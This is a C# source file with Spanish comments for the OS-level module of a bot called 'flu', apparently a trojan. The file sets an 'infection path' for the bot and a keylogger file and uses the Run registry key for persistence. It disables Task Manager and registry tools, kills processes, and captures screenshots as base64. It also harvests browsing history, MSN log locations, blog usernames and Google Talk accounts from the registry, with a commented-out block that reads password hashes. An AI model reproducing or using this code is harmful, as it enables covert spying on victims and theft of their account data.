using System;
using Microsoft.Win32;
using System.Drawing;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;
using System.Security.Principal;
using System.Collections.Generic;

namespace flu
{
    /// <summary>
    /// La clase OS engloba todas las funciones que actuan sobre el Sistema Operativo
    /// </summary>
    class OS
    {
        // Claves del registro necesarias
        public const string RunKey      = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        public const string SystemKey   = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
        private const string DesktopKey = "Control Panel\\Desktop";

        // Funciones importadas
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        [DllImport("winmm.dll")]
        private static extern long mciSendString(string strCommand, StringBuilder strReturn, int iReturnLength, IntPtr hwndCallback);

        /// <summary>
        /// Comprobar si el sistema operativo es XP o es otro sistema operativo superior
        /// </summary>
        /// <returns>Devuelve True si se trata de un Windows XP y False si se trata de Vista, 7 o superior</returns>
        public static bool IsXP()
        {
            //Si la versión del Kernel es 5.X se trata de un Windows XP
            if (Environment.OSVersion.Version.ToString()[0].ToString() == "5") { return true; }
            return false;
        }

        /// <summary>
        /// Devuelve la version del sistema operativo
        /// </summary>
        /// <returns>String con la version del sistema operativo</returns>
        public static string Version()
        {
            return Environment.OSVersion.Version.ToString()[0] + "." 
                    + Environment.OSVersion.Version.ToString()[2];
        }

        /// <summary>
        /// Comprueba si el usuario es administrador del equipo
        /// </summary>
        /// <returns>Devuelve True/False dependiendo de si el usuario es Adminsitrador o no</returns>
        public static bool IsAdministrator()
        {
                WindowsIdentity  wi = WindowsIdentity.GetCurrent();
                WindowsPrincipal wp = new WindowsPrincipal(wi);
                return wp.IsInRole(WindowsBuiltInRole.Administrator);
        }

        /// <summary>
        /// Devuelve la ruta donde se almacenará el ejecutable de flu, el fichero del keylogger y la foto del fondo
        /// </summary>
        /// <returns>Devuelve un string con la ruta donde se almacenarán los archivos requeridos por el bot</returns>
        public static string InfectionPath()
        {
            return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        }

        /// <summary>
        /// Mata el proceso solicitado
        /// </summary>
        /// <param name="name">Nombre del proceso a matar</param>
        public static void KillProcess(string name)
        {
            Process[] processes = Process.GetProcesses();
            foreach (Process process in processes)
            { if (process.ProcessName == name) { process.Kill(); } }
        }

        /// <summary>
        /// Modifica el fondo de pantalla del escritorio del usuario actual
        /// </summary>
        /// <param name="path">Ruta donde se encuentra el nuevo fondo de pantalla</param>
        public static void ChangeWallpaper(string path)
        {
            // Cambiar fondo de escritorio en el registro (requiere reinicio)
            RegistryKey key = Registry.CurrentUser.OpenSubKey(DesktopKey, true);
            key.SetValue("Wallpaper", path);
            key.Close();
            // Cambiar fondo de escritorio sin reiniciar
            SystemParametersInfo(0x14, 0, "(None)", 0x3);
            SystemParametersInfo(0x14, 0, path, 0x3);
        }

        /// <summary>
        /// Activa/Desactiva el Administrador de Tareas
        /// </summary>
        public static void SwitchTaskManager()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(SystemKey, true);
            int state = (int)key.GetValue("DisableTaskMgr");
            key.SetValue("DisableTaskMgr", 1 - state);
            key.SetValue("DisableRegistryTools", 1);
            key.Close();
        }

        /// <summary>
        /// Realiza una captura de pantalla
        /// </summary>
        /// <returns>Devuelve el código de la imágen en Base 64</returns>
        public static string CaptureScreen()
        {
            // fixme
            // Solo captura una pantalla
            Rectangle region = Screen.AllScreens[0].Bounds;
            Bitmap bitmap = new Bitmap(region.Width, region.Height, PixelFormat.Format32bppPArgb);
            Graphics graphic = Graphics.FromImage(bitmap);
            graphic.CopyFromScreen(region.Left, region.Top, 0, 0, region.Size);
            System.IO.MemoryStream stream = new System.IO.MemoryStream();
            bitmap.Save(stream, System.Drawing.Imaging.ImageFormat.Png);
            String base64String = Convert.ToBase64String(stream.ToArray());
            stream.Close();
            stream.Dispose();
            return base64String;
        }

        /// <summary>
        /// Reproduce un archivo multimedia del disco duro
        /// </summary>
        /// <param name="filename">Ruta donde se encuentra el archivo multimedia</param>
        public static void PlayAudio(string filename)
        {
            mciSendString("open \"" + filename + "\" type mpegvideo alias MediaFile", null, 0, IntPtr.Zero);
            mciSendString("play MediaFile", null, 0, IntPtr.Zero);
        }

        /// <summary>
        /// Extrae información de MSN del registro de Windows
        /// </summary>
        /// <returns></returns>
        public static List<string> getMsnTalks()
        {
            List<string> convers = new List<string>();
            convers.Add("Msn talks:");
            string regPath = "SOFTWARE\\Microsoft\\MSNMessenger\\PerPassportSettings";
            RegistryKey rk1 = Registry.CurrentUser.OpenSubKey(regPath, true);
            string[] msnAccounts = rk1.GetSubKeyNames();
            foreach (string c in msnAccounts)
            {
                RegistryKey rk2 = Registry.CurrentUser.OpenSubKey(regPath + "\\" + c, true);
                if (rk2.GetValue("MessageLogPath") != null)
                    convers.Add(rk2.GetValue("MessageLogPath").ToString());
            }
            rk1.Close();
            return convers;
        }

        /// <summary>
        /// Extrae información acerca de las películas editadas con MovieMaker del registro de Windows
        /// </summary>
        /// <returns></returns>
        public static List<string> getMoviesMade()
        {
            List<string> movies = new List<string>();
            movies.Add("Created movies:");
            string rutaRegistro = "SOFTWARE\\Microsoft\\Windows Live\\Movie Maker\\Recent";
            RegistryKey rk1 = Registry.CurrentUser.OpenSubKey(rutaRegistro, true);
            string[] Movies = rk1.GetValueNames();
            foreach (string m in Movies)
            {
                movies.Add(rk1.GetValue(m).ToString());
            }
            rk1.Close();
            return movies;
        }

        /// <summary>
        /// Extrae información de la negación con Internet Explorer del registro de Windows
        /// </summary>
        /// <returns></returns>
        public static List<string> getInternetExplorerTypedUrls()
        {
            List<string> urls = new List<string>();
            urls.Add("Internet Explorer - Typed URLs:");
            string rutaRegistro = "SOFTWARE\\Microsoft\\Internet Explorer\\TypedURLs";
            RegistryKey rk1 = Registry.CurrentUser.OpenSubKey(rutaRegistro, true);
            string[] typedUrls = rk1.GetValueNames();
            foreach (string m in typedUrls)
            {
                urls.Add(rk1.GetValue(m).ToString());
            }
            rk1.Close();
            return urls;
        }

        /// <summary>
        /// Extrae información acerca de los blogs que administra desde Live Writter del registro de Windows
        /// </summary>
        /// <returns></returns>
        public static List<string> getBlogs()
        {
            List<string> blogs = new List<string>();
            blogs.Add("Blogs:");
            string regPath = "SOFTWARE\\Microsoft\\Windows Live\\Writer\\Weblogs";

            RegistryKey rk1 = Registry.CurrentUser.OpenSubKey(regPath, true);
            string[] blogAccounts = rk1.GetSubKeyNames();
            foreach (string c in blogAccounts)
            {
                RegistryKey rk2 = Registry.CurrentUser.OpenSubKey(regPath + "\\" + c, true);
                if (rk2.GetValue("HomepageUrl") != null)
                    blogs.Add("Blog: " + rk2.GetValue("HomepageUrl"));
                RegistryKey rk3 = Registry.CurrentUser.OpenSubKey(regPath + "\\" + c + "\\Credentials", true);
                string[] logins = rk3.GetValueNames();
                foreach (string l in logins)
                {
                    if (l.Equals("Username"))
                        blogs.Add("User: " + rk3.GetValue(l).ToString());
                }
            }
            rk1.Close();
            return blogs;
        }

        /// <summary>
        /// Extrae información de Gtalk del registro de Windows
        /// </summary>
        /// <returns></returns>
        public static List<string> getGoogleAccount()
        {
            List<string> accounts = new List<string>();
            accounts.Add("Google accounts");
            string regPath = "Software\\Google\\Google Talk\\Accounts";

            RegistryKey rk1 = Registry.CurrentUser.OpenSubKey(regPath, true);
            string[] googleAccounts = rk1.GetSubKeyNames();
            foreach (string g in googleAccounts)
            {
                accounts.Add(g);
                /*try
                {
                    RegistryKey rk2 = Registry.CurrentUser.OpenSubKey(regPath + "\\" + g, true);
                    if (rk2.GetValue("pw") != null)
                        accounts.Add("Password (Hash): " + rk2.GetValue("pw"));
                }
                catch { }*/
            }
            rk1.Close();
            return accounts;
        }

        /// <summary>
        /// Devuelve el valor de una clave del registro
        /// </summary>
        /// <param name="rKey">Valor de una clave del registro</param>
        /// <returns></returns>
        public static string getKeyValue(string rKey)
        {
            string value = string.Empty;
            RegistryKey rk1 = Registry.CurrentUser.OpenSubKey(RunKey, true);
            String[] claves = rk1.GetValueNames();
            foreach (String c in claves)
            {
                if (c.Equals(rKey))
                {
                    //Borramos entrada de Flu en el registro
                    try
                    {
                        value = rk1.GetValue(c).ToString();
                    }
                    catch { }
                    break;
                }
            }
            rk1.Close();
            return value;
        }
    }
}